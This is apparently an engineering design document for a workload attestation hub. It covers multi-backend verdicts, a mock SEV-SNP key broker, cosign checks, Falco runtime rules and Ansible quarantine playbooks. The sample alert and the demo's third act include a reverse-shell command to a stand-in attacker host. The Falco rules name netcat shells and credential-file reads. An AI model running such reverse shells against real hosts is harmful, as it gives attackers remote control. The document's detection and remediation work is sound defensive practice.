# Phase 3: Multi-Backend Attestation, Runtime Monitoring, and Auto-Remediation

## Intent

Extend arbiter-hub from single-backend-per-workload attestation to composite
multi-backend attestation, add runtime behavioral monitoring via Falco eBPF,
and close the remediation loop with Event-Driven Ansible (EDA). The demo
showcases the agentic workload lifecycle: independent attestation types first,
then stacking on one workload, then misbehavior → quarantine → recovery.

### Why now

Phase 2.5 proved the core loop: OIDC auth → Keylime TPM attestation → state
machine → audit trail. But arbiter-hub's value proposition is *federation* —
arbitrating trust across multiple attestation backends. A single backend
doesn't tell that story. Additionally, attestation without runtime monitoring
is point-in-time trust; Falco adds continuous behavioral verification, and
EDA closes the loop so trust violations trigger automated response.

## Goals

1. **Multi-backend attestation:** A workload declares multiple `backend_types`.
   The attest endpoint runs all backends in parallel, returns per-backend
   verdicts and a composite verdict (PASS only if all backends PASS).
2. **Mock KBS service:** Lightweight FastAPI service mimicking the Trustee
   `/kbs/v0/` API. Returns SEV-SNP-shaped attestation evidence. Runs
   containerized alongside arbiter-hub. Zero code change to TrusteeBackend.
3. **Cosign wiring:** Sign the arbiter-hub-api container image with cosign,
   register an agentic workload with `artifact_ref`, verify via CosignBackend.
4. **Falco integration:** Inbound webhook receiver for Falco alerts. Alert
   triggers HEALTHY → FAILED state transition with Falco event as evidence.
   Custom Falco rules per `workload_type`.
5. **EDA integration:** Outbound webhook dispatcher on state transitions.
   EDA source plugin + rulebooks for quarantine, re-attestation, and forensic
   collection.
6. **Three-act demo flow:** Independent types (Act 1) → stacking (Act 2) →
   misbehavior and auto-remediation (Act 3).

## Non-Goals

- Real SEV-SNP/TDX hardware attestation (mock KBS simulates it)
- Production Falco rule tuning (PoC rules only)
- Real Rekor transparency log (cosign keyless mode deferred)
- Changing the OIDC auth or RBAC model (Phase 2.5 stays as-is)
- UI changes for multi-backend visualization (deferred to Phase 3.5)
- OPA/Cedar policy engine (current simple rules engine sufficient)

## Anti-Goals

- Mock KBS must not look fake — attestation evidence should match real
  SEV-SNP report structure (REPORT_DATA, MEASUREMENT, POLICY fields)
- EDA playbooks must not run destructive operations on unrelated hosts
- Falco rules must not generate false-positive alerts that overwhelm the
  state machine (use severity filtering)

## Constraints

- Python 3.11+ / FastAPI / SQLAlchemy async (match existing stack)
- PostgreSQL (existing, with async driver)
- Alembic for schema migrations (existing pattern)
- Falco 0.38+ with eBPF driver (no kernel module)
- ansible-rulebook 1.1+ for EDA
- cosign v2 binary on the system
- Container images via Podman Quadlet (existing pattern)
- All new endpoints require OIDC auth (existing middleware)
- Beaker lab deployment (RHEL 10, IPA domain)

## Architecture

### Current State (Phase 2.5)

```
Workload ──(1 backend_type)──► BackendRegistry.get(name) ──► verify()
```

One workload → one backend → one verdict → one state transition.

### Target State (Phase 3)

```
Workload ──(N backend_types)──► for each: BackendRegistry.get(name) ──► verify()
                                    │
                                    ▼
                              CompositeResult
                              ├── per_backend: [{backend, verdict, evidence_hash}]
                              ├── composite_verdict (see rules below)
                              └── state transition based on composite
```

### Composite Verdict Rules

Verdicts are resolved with "FAIL trumps UNAVAILABLE" semantics:

1. If **any** backend returns FAIL → composite = **FAIL** → workload → FAILED
2. If **no** FAIL but **any** UNAVAILABLE or ERROR → composite = **UNAVAILABLE** → workload stays in ATTESTING (no transition, retry later)
3. **All** backends PASS → composite = **PASS** → workload → HEALTHY

This preserves Phase 2.5's resilience behavior (transient backend outages
don't cause false failures) while ensuring real attestation failures always
surface. A Keylime network blip during composite attestation does not mask
a genuine cosign FAIL, and vice versa.

### Falco → Arbiter Hub → EDA Flow

```
Workload container
    │ (syscalls)
    ▼
eBPF probes (kernel) → Falco engine → rules eval
    │
    ▼ (alert: priority >= WARNING)
POST /api/workloads/{id}/alerts
    │
    ▼
State: HEALTHY → FAILED (with Falco evidence)
    │
    ▼
Outbound webhook → EDA source
    │
    ▼
Rulebook: quarantine playbook (network isolation, cert revocation)
    │
    ▼ (admin reviews, fixes root cause)
POST /api/workloads/{id}/remediate
    │
    ▼
State: FAILED → UNDER_REMEDIATION → ATTESTING → re-attest → HEALTHY
```

## Data Model Changes

### Schema Migration: `backend_types` Column

Current `workloads` table:
```
backend_type: BackendType (single enum, NOT NULL)
```

New:
```
backend_types: ARRAY(String) (list of backend name strings, NOT NULL)
```

The `backend_type` column is replaced by `backend_types` (PostgreSQL ARRAY).
Values are `BackendType` enum string values. Migration converts existing
single values: `"keylime"` → `["keylime"]`.

The `AttestationRecord` table keeps its single `backend` column — one record
per backend per attestation run. A composite attestation creates N records
(one per backend) linked to the same workload and timestamp.

### New Schema: `CompositeAttestationResult`

```python
@dataclass
class CompositeAttestationResult:
    composite_verdict: AttestationVerdict  # PASS iff all PASS
    backend_results: list[AttestationResult]  # per-backend
    timestamp: datetime
```

### Pydantic Updates

`WorkloadCreate.backend_type` → `WorkloadCreate.backend_types: list[BackendType]`
(minimum 1 element). `WorkloadRead` updated to match.

Backward compatibility: accept `backend_type` (singular) in request body as
alias for `backend_types: [value]`. Response always returns `backend_types`.

### New Endpoint: `POST /api/workloads/{id}/alerts`

Falco alert receiver. Accepts Falco webhook JSON format:

```json
{
    "uuid": "...",
    "output": "Unexpected process execution (user=root command=nc ...)",
    "priority": "Warning",
    "rule": "Unexpected outbound connection",
    "time": "2026-10-19T12:00:00Z",
    "output_fields": {
        "container.id": "abc123",
        "proc.name": "nc",
        "proc.cmdline": "nc -e /bin/sh attacker.com 4444"
    }
}
```

Behavior:
- Maps Falco alert to workload via `container.id` → workload metadata lookup
  (OR via workload_id in URL path)
- Priority >= WARNING → transitions HEALTHY → FAILED
- Priority < WARNING → logs alert but does not transition
- Stores Falco alert as attestation record with `backend: "falco"` and
  verdict FAIL

Auth: requires `trigger_attestation` permission (same as attest endpoint).
For Falco webhook integration, use a dedicated service client with this scope.

### New Endpoint: `POST /api/webhooks/register`

Registers outbound webhook URLs for state transition notifications.

```json
{
    "url": "https://eda-controller.arbiter.test:5001/api/v1/webhook",
    "events": ["state_transition"],
    "secret": "shared-hmac-secret"
}
```

Webhooks stored in a `webhooks` table. On state transition, arbiter-hub
POSTs to all registered URLs with HMAC-SHA256 signature in
`X-Arbiter-Signature` header.

### New BackendType: FALCO

Add `FALCO = "falco"` to `BackendType` enum. Falco is not a traditional
attestation backend (no `verify()` call) — it's event-driven. The alerts
endpoint handles inbound events. The `FalcoBackend` class implements the
`AttestationBackend` protocol with:
- `verify()` → checks most recent Falco alert age (stale = no recent alerts = healthy)
- `health()` → checks Falco sidecar is running via its `/healthz` endpoint
- `enroll()` / `revoke()` → no-ops (Falco watches all containers)

## Mock KBS Service

Standalone FastAPI app in `mock-kbs/` directory:

```
mock-kbs/
├── Containerfile
├── main.py          # FastAPI app
├── evidence.py      # SEV-SNP report generator
└── README.md
```

### Endpoints

- `GET /kbs/v0/health` → `{"status": "ok"}`
- `POST /kbs/v0/attest` → validates `tee_type` and `evidence`, returns:
  ```json
  {
      "attestation_pass": true,
      "report": {
          "report_data": "<hex>",
          "measurement": "<hex>",
          "policy": "0x...",
          "platform_version": "Milan-B1",
          "guest_svn": 1
      }
  }
  ```
- `POST /kbs/v0/register` → stores expected measurements, returns OK
- `GET /kbs/v0/secrets/{repo}/{type}/{tag}` → returns mock secret (only if
  latest attestation passed)

### Evidence Format

Mock evidence matches AMD SEV-SNP attestation report structure:
- 64-byte REPORT_DATA (sha256 of workload identity)
- 48-byte MEASUREMENT (launch digest)
- POLICY flags (SMT, migration, debug)
- PLATFORM_INFO and versioning fields

The mock KBS accepts evidence where MEASUREMENT matches a pre-registered
value (from `/kbs/v0/register`). Unknown measurements → `attestation_pass: false`.

### Container

```dockerfile
FROM registry.access.redhat.com/ubi9/python-311:latest
COPY . /app
RUN pip install fastapi uvicorn
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8085"]
```

Quadlet: `mock-kbs.container`, port 8085 (same port TrusteeBackend expects).

## Cosign Integration

### Signing the Container Image

On build machine (not Beaker — cosign key stays off lab):
```bash
cosign generate-key-pair
cosign sign --key cosign.key quay.io/rhel-security/arbiter-hub-api:latest
```

Public key deployed to Beaker lab at `/etc/arbiter/cosign.pub`.

### CosignBackend Wiring

Already implemented in `server/backends/cosign.py`. Needs:
1. `cosign` binary installed on CLIENT
2. Public key available at configured path
3. Workload metadata includes `artifact_ref` pointing to the signed image

The existing `cosign verify` command in CosignBackend needs a `--key` flag
added when not using keyless (Fulcio) verification:

```python
cmd = [self._binary, "verify", "--key", self._public_key, "--yes", artifact_ref]
```

Add `public_key` parameter to `CosignBackend.__init__()`.

### Registration in main.py lifespan

```python
if settings.cosign_public_key:
    from server.backends.cosign import CosignBackend
    registry.register("cosign", CosignBackend(public_key=settings.cosign_public_key))
```

## Falco Setup

### Falco on Beaker

Install Falco with eBPF driver on CLIENT:
```bash
dnf install -y falco
falco --modern-bpf  # or configure in /etc/falco/falco.yaml
```

### Custom Rules

`deploy/falco/arbiter-rules.yaml`:

```yaml
- rule: Unexpected process in workload container
  desc: Detect execution of unexpected processes in attested containers
  condition: >
    spawned_process and container and
    not proc.name in (python3, uvicorn, gunicorn, node, nginx) and
    not proc.name startswith "arbiter"
  output: >
    Unexpected process in attested container
    (user=%user.name command=%proc.cmdline container=%container.id image=%container.image.repository)
  priority: WARNING
  tags: [arbiter, runtime]

- rule: Reverse shell detected
  desc: Detect reverse shell attempts
  condition: >
    spawned_process and container and
    proc.name in (nc, ncat, bash, sh) and
    fd.type = ipv4 and fd.l4proto = tcp
  output: >
    Reverse shell detected (user=%user.name command=%proc.cmdline container=%container.id)
  priority: CRITICAL
  tags: [arbiter, runtime, security]

- rule: Sensitive file access
  desc: Detect access to sensitive files in workload containers
  condition: >
    open_read and container and
    fd.name in (/etc/shadow, /etc/passwd, /etc/sudoers, /proc/1/environ)
  output: >
    Sensitive file access (user=%user.name file=%fd.name container=%container.id)
  priority: WARNING
  tags: [arbiter, runtime, security]
```

### Falco Webhook Output

Configure Falco to POST alerts to arbiter-hub:
```yaml
# /etc/falco/falco.yaml
http_output:
  enabled: true
  url: "https://runner.arbiter.test:8443/api/workloads/{workload_id}/alerts"
  user_agent: "falco/0.38"
```

Note: Falco's native webhook doesn't support per-container URL routing.
Alternative: Falco posts to a single receiver endpoint
`POST /api/alerts/falco` which looks up the workload by container ID from
the alert's `output_fields.container.id`.

### Container ID → Workload Mapping (Builder's call)

Workloads include `container_id` in their metadata at registration time or
via a PATCH update after deployment. The Falco global endpoint looks up
workloads by querying `metadata_->>'container_id'` in the JSONB column.
No schema change needed — uses existing freeform metadata. If a workload
has multiple containers (agent with sidecars), register each container ID
as a comma-separated list or array in the metadata; the lookup checks
containment.

## EDA Integration

### Components

```
eda/
├── plugins/
│   └── event_source/
│       └── arbiter_hub.py    # Webhook receiver source
├── rulebooks/
│   ├── attestation.yml       # State transition responses
│   └── demo.yml              # Simplified demo rulebook
├── playbooks/
│   ├── quarantine.yml        # Network isolation + cert revocation
│   ├── re_attest.yml         # Trigger re-attestation via API
│   └── forensic_collect.yml  # Evidence snapshot
└── inventory/
    └── beaker.yml            # Lab hosts
```

### Outbound Webhook Dispatcher

On state transitions, arbiter-hub POSTs to registered webhook URLs:

```json
{
    "event_type": "state_transition",
    "workload_id": "16b48e79-...",
    "workload_name": "agent-worker-1",
    "from_state": "healthy",
    "to_state": "failed",
    "triggered_by": "falco_alert",
    "timestamp": "2026-10-19T12:00:00Z",
    "detail": {
        "falco_rule": "Reverse shell detected",
        "falco_priority": "CRITICAL"
    }
}
```

HMAC-SHA256 signature in `X-Arbiter-Signature` header for webhook auth.

### Webhook Coexistence (Builder's call)

The codebase already has a YAML-file-based webhook system in
`server/telemetry/webhooks.py` (loads from `/etc/arbiter/webhooks.yaml`,
bearer_token auth, configurable retry). The new DB-backed webhook API
runs alongside it — both fire on state transitions. The delivery path
merges both sources: YAML-configured webhooks + DB-registered webhooks
both receive events. Demo uses the new DB-backed system. No migration
of existing YAML consumers needed.

### EDA Source Plugin

`eda/plugins/event_source/arbiter_hub.py` — HTTP webhook receiver:

```python
async def main(queue: asyncio.Queue, args: dict):
    """EDA source plugin — receives arbiter-hub webhook events."""
    app = web.Application()
    app.router.add_post("/webhook", lambda req: handle(req, queue, args))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, args.get("host", "0.0.0.0"), args.get("port", 5001))
    await site.start()
    # Keep running
    while True:
        await asyncio.sleep(3600)
```

### Demo Rulebook

```yaml
---
- name: Arbiter Hub attestation responses
  hosts: all
  sources:
    - arbiter_hub:
        host: 0.0.0.0
        port: 5001
        hmac_secret: "{{ arbiter_webhook_secret }}"

  rules:
    - name: Quarantine failed workload
      condition: event.to_state == "failed"
      action:
        run_playbook:
          name: playbooks/quarantine.yml
          extra_vars:
            workload_id: "{{ event.workload_id }}"
            reason: "{{ event.detail.falco_rule | default('attestation_failure') }}"

    - name: Re-attest stale workload
      condition: event.to_state == "stale"
      action:
        run_playbook:
          name: playbooks/re_attest.yml
          extra_vars:
            workload_id: "{{ event.workload_id }}"
            api_url: "https://runner.arbiter.test:8443"

    - name: Forensic collect on critical alert
      condition: >
        event.to_state == "failed" and
        event.detail.falco_priority is defined and
        event.detail.falco_priority == "CRITICAL"
      action:
        run_playbook:
          name: playbooks/forensic_collect.yml
          extra_vars:
            workload_id: "{{ event.workload_id }}"
            container_id: "{{ event.detail.container_id | default('unknown') }}"
```

### Quarantine Playbook

```yaml
---
- name: Quarantine failed workload
  hosts: "{{ target_host | default('localhost') }}"
  tasks:
    - name: Isolate container network
      containers.podman.podman_container:
        name: "{{ container_name }}"
        network_mode: none
        state: started

    - name: Notify arbiter-hub of remediation
      uri:
        url: "{{ api_url }}/api/workloads/{{ workload_id }}/remediate"
        method: POST
        headers:
          Authorization: "Bearer {{ arbiter_token }}"
          Content-Type: application/json
        body_format: json
        body:
          justification: "Auto-quarantined: {{ reason }}"
        validate_certs: false
```

## Demo Script: Three Acts

### Act 1 — Independent Attestation Types

1. **Service workload → Keylime** (existing)
   - Show TPM attestation PASS, workload HEALTHY

2. **CVM workload → Trustee (mock KBS)**
   - Register workload with `tee_type: "sev-snp"`, `tee_evidence: "<mock>"`
   - Attest → mock KBS validates measurement → PASS
   - Show SEV-SNP-shaped evidence in attestation record

3. **Agentic workload → cosign**
   - Register workload with `artifact_ref: "quay.io/rhel-security/arbiter-hub-api:latest"`
   - Attest → cosign verifies image signature → PASS
   - Show signature verification in attestation record

### Act 2 — Stacking on One Agentic Workload

1. Register agentic workload with `backend_types: ["keylime", "cosign"]`
2. Trigger attestation → both backends run in parallel
3. Show composite result: `{keylime: PASS, cosign: PASS} → composite: PASS`
4. Tamper with image tag → re-attest → `{keylime: PASS, cosign: FAIL} → composite: FAIL`

### Act 3 — Runtime Monitoring and Auto-Remediation

1. Workload is HEALTHY (from Act 2 re-attestation after fix)
2. Exec into the agent container: `nc -e /bin/sh attacker.com 4444`
3. Falco catches it → POST to `/api/alerts/falco` → HEALTHY → FAILED
4. EDA rulebook fires → quarantine playbook runs → network isolation
5. State: FAILED → UNDER_REMEDIATION (via EDA playbook)
6. Admin reviews audit trail, fixes root cause
7. Trigger re-attestation → all backends PASS → HEALTHY
8. Show the full state transition history: 7 states traversed

## Implementation Order

1. Schema migration (`backend_types` array column)
2. Update `WorkloadCreate`/`WorkloadRead` schemas and API
3. Composite attestation in `attestation.py`
4. Mock KBS service
5. CosignBackend `--key` flag + lifespan registration
6. Falco alert receiver endpoint
7. FalcoBackend stub
8. Outbound webhook dispatcher
9. EDA source plugin + rulebooks + playbooks
10. Falco rules and deployment config
11. Demo script update

## Left to the Builder

- Exact mock SEV-SNP evidence byte layout (functional, not cryptographically valid)
- Webhook retry/backoff strategy (suggest 3 retries, exponential backoff)
- Falco rule severity thresholds (WARNING vs CRITICAL triggering behavior)
- EDA inventory structure for multi-host Beaker deployment
- Whether `check_stale_workloads` scheduler should also trigger composite re-attestation
- GIN index on metadata JSONB for container_id lookups (add if query performance warrants it)
